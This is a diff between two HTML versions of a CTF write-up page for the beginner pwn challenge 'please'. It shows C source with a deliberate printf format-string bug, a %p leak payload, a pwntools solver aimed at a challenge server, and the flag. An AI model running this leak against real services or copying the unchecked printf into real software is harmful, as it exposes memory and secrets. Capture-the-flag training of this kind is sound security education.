@@ -1,119 +1,236 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="theme-color" content="#0c0c0e">
-<title>please — FST Bootcamp — r3t0x</title>
-<meta name="description" content="Sometimes all you have to do is ask nicely... or exploit the binary's trust. Manipulate the input to satisfy conditions and trick the program into giv…">
-<meta name="author" content="Ghaith Amdouni">
-<link rel="canonical" href="https://r3t0x.me/challenge/fst-bootcamp/please/">
-<meta property="og:type" content="article">
-<meta property="og:title" content="please — FST Bootcamp — r3t0x">
-<meta property="og:description" content="Sometimes all you have to do is ask nicely... or exploit the binary's trust. Manipulate the input to satisfy conditions and trick the program into giv…">
-<meta property="og:url" content="https://r3t0x.me/challenge/fst-bootcamp/please/">
-<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
-<meta name="twitter:card" content="summary_large_image">
-<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
-<link rel="stylesheet" href="/static/css/main.css?v=405b62c3d8">
-<script src="/static/js/main.js?v=405b62c3d8" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>please // r3t0x</title>
+    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+    <meta name="description" content="Sometimes all you have to do is ask nicely... or exploit the binary&#39;s trust. Manipulate the input to satisfy conditions and trick the program into giv">
+    <link rel="stylesheet" href="../../../static/css/style.css?v=43fea522e0ce">
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
-<header class="masthead">
-  <div class="shell">
-    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
-    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
-    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
-  </div>
-</header>
-<main id="main"><div class="shell narrow"><article class="writeup">
-  <header class="page-head">
-    <p class="kicker"><a href="/blog/#fst-bootcamp">FST Bootcamp</a> / pwn</p>
-    <h1>please</h1>
-    <p class="lede">Sometimes all you have to do is ask nicely... or exploit the binary's trust. Manipulate the input to satisfy conditions and trick the program into giv…</p>
-    <dl class="facts">
-      <div><dt>difficulty</dt><dd>easy</dd></div>
-      <div><dt>points</dt><dd>—</dd></div>
-      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
-      <div><dt>author</dt><dd>R3t0x</dd></div>
-    </dl>
-    <p class="tags"><span>Format String — Stack Data Leak</span></p>
-  </header>
-  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#strategy">Strategy</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
-  <div class="prose">
-    <h2 id="reconnaissance">Reconnaissance</h2>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>please<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x6050ce63</span>
+                <span>by r3t0x</span>
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                Sometimes all you have to do is ask nicely... or exploit the binary&#39;s trust. Manipulate the input to satisfy conditions and trick the program into giving you what you want.
+            </div>
+        </div>
+
+
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// please.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+
+int main(void)
+{
+  char buffer[0x200];
+  char flag[0x200];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  memset(buffer, 0, sizeof(buffer));
+  memset(flag, 0, sizeof(flag));
+
+  int fd = open(&#34;flag.txt&#34;, O_RDONLY);
+  if (fd == -1) {
+    puts(&#34;failed to read flag. please contact an admin if this is remote&#34;);
+    exit(1);
+  }
+
+  read(fd, flag, sizeof(flag));
+  close(fd);
+
+  puts(&#34;what do you say?&#34;);
+
+  read(0, buffer, sizeof(buffer) - 1);
+  buffer[strcspn(buffer, &#34;\n&#34;)] = 0;
+
+  if (!strncmp(buffer, &#34;please&#34;, 6)) {
+    printf(buffer);
+    puts(&#34; to you too!&#34;);
+  }
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Please — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Format String — Stack Data Leak</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
 <p>The binary reads the flag into a stack variable, then asks for user input. If input starts with "please", it passes the buffer to <code>printf()</code> as a format string:</p>
-<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>char flag[0x200];
-read(fd, flag, sizeof(flag));  // flag is on the stack!
-printf(buffer);  // format string vuln</code></pre></figure>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
+<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span><span class="w">  </span><span class="c1">// flag is on the stack!</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w">  </span><span class="c1">// format string vuln</span>
+</code></pre></div>
 
-<h2 id="strategy">Strategy</h2>
+<h2>Strategy</h2>
 <p>Since the flag is on the stack and we control a format string, we use <code>%p</code> specifiers to leak stack contents. The flag bytes are stored as stack values that we can read with <code>%N$p</code> notation.</p>
-<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>payload = b'please' + b'.%p' * 40</code></pre></figure>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;please&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.%p&#39;</span> <span class="o">*</span> <span class="mi">40</span>
+</code></pre></div>
 
-<h2 id="exploit">Exploit</h2>
-<figure class="code"><figcaption><span>python</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-k">from</span> pwn <span class="t-k">import</span> *
-io = <span class="t-f">remote</span>(<span class="t-s">'35.159.81.154'</span>, <span class="t-m">7001</span>)
-io.<span class="t-f">sendline</span>(b<span class="t-s">'please'</span> + b<span class="t-s">'.%p'</span> * <span class="t-m">40</span>)
-data = io.<span class="t-f">recvall</span>()
-<span class="t-c"># Parse hex values, convert to ASCII</span></code></pre></figure>
+<h2>Exploit</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.159.81.154&#39;</span><span class="p">,</span> <span class="mi">7001</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.%p&#39;</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="c1"># Parse hex values, convert to ASCII</span>
+</code></pre></div>
 
-<h2 id="result">Result</h2>
-<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>please.0x7fffffffdc90.0x200.(nil).0x4654537b...
-# Decode hex → Securinets_fst{n0w_th4t_w4s_p0l1t3}</code></pre></figure>
-    <h2 id="solver">Reference solver</h2>
-    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-c">#!/usr/bin/env python3</span>
-<span class="t-k">from</span> pwn <span class="t-k">import</span> *
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>please.0x7fffffffdc90.0x200.(nil).0x4654537b...
+<span class="gh">#</span> Decode hex → Securinets_fst{n0w_th4t_w4s_p0l1t3}
+</code></pre></div>
+            </div>
+        </div>
+        
 
-<span class="t-c"># Your binary is called &quot;main&quot;, not &quot;./bin/please&quot;</span>
-p = <span class="t-f">process</span>(<span class="t-s">&quot;./main&quot;</span>)          <span class="t-c"># &lt;-- THIS IS THE ONLY LINE YOU NEED TO CHANGE</span>
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
+from pwn import *
 
-pay = <span class="t-s">&quot;please;&quot;</span>
-cnt = <span class="t-m">5</span>
+# Your binary is called &#34;main&#34;, not &#34;./bin/please&#34;
+p = process(&#34;./main&#34;)          # &lt;-- THIS IS THE ONLY LINE YOU NEED TO CHANGE
 
-<span class="t-k">for</span> i <span class="t-k">in</span> <span class="t-f">range</span>(cnt):
-    pay += <span class="t-s">&quot;%&quot;</span> + <span class="t-f">str</span>(<span class="t-m">0x200</span> // <span class="t-m">8</span> + <span class="t-m">6</span> + i) + <span class="t-s">&quot;$llx;&quot;</span>
+pay = &#34;please;&#34;
+cnt = 5
 
-p.<span class="t-f">sendlineafter</span>(b<span class="t-s">&quot;what do you say?\n&quot;</span>, pay.<span class="t-f">encode</span>())
+for i in range(cnt):
+    pay += &#34;%&#34; + str(0x200 // 8 + 6 + i) + &#34;$llx;&#34;
 
-p.<span class="t-f">recvuntil</span>(b<span class="t-s">&quot;;&quot;</span>)                      <span class="t-c"># skip the &quot;please;&quot;</span>
+p.sendlineafter(b&#34;what do you say?\n&#34;, pay.encode())
 
-leak = b<span class="t-s">&quot;&quot;</span>
-<span class="t-k">for</span> i <span class="t-k">in</span> <span class="t-f">range</span>(cnt):
-    hex_str = p.<span class="t-f">recvuntil</span>(b<span class="t-s">&quot;;&quot;</span>, drop=<span class="t-k">True</span>)
-    leak += <span class="t-f">p64</span>(<span class="t-f">int</span>(hex_str, <span class="t-m">16</span>))
+p.recvuntil(b&#34;;&#34;)                      # skip the &#34;please;&#34;
 
-<span class="t-f">print</span>(<span class="t-s">&quot;[+] Leaked raw bytes:&quot;</span>)
-<span class="t-f">print</span>(leak)
+leak = b&#34;&#34;
+for i in range(cnt):
+    hex_str = p.recvuntil(b&#34;;&#34;, drop=True)
+    leak += p64(int(hex_str, 16))
 
-<span class="t-f">print</span>(<span class="t-s">&quot;\n[+] Flag:&quot;</span>)
-<span class="t-f">print</span>(leak.<span class="t-f">split</span>(b<span class="t-s">'\x00'</span>)[<span class="t-m">0</span>].<span class="t-f">decode</span>())   <span class="t-c"># clean output, removes null padding</span>
-p.<span class="t-f">close</span>()</code></pre></figure>
-    <h2 id="flag">Flag</h2>
-    <p class="flag"><code>Securinets_fst{n0w_th4t_w4s_p0l1t3}</code><button type="button" class="copy" data-copy>copy</button></p>
-  </div>
-  <nav class="pager" aria-label="More writeups">
-    <a href="/challenge/fst-bootcamp/b0f/"><span>previous</span><strong>b0f</strong></a>
-    <a class="next" href="/challenge/fst-bootcamp/ret2shellcode/"><span>next</span><strong>ret2shellcode</strong></a>
-  </nav>
-</article></div></main>
-<footer class="colophon">
-  <div class="shell">
-    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
-    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
-    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
-  </div>
-</footer>
-<dialog id="search" aria-label="Search">
-  <form method="dialog" class="search-head">
-    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
-    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
-    <button value="close" aria-label="Close search">esc</button>
-  </form>
-  <ul id="search-results"></ul>
-  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
-</dialog>
+print(&#34;[+] Leaked raw bytes:&#34;)
+print(leak)
+
+print(&#34;\n[+] Flag:&#34;)
+print(leak.split(b&#39;\x00&#39;)[0].decode())   # clean output, removes null padding
+p.close()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js?v=43fea522e0ce"></script>
 </body>
 </html>
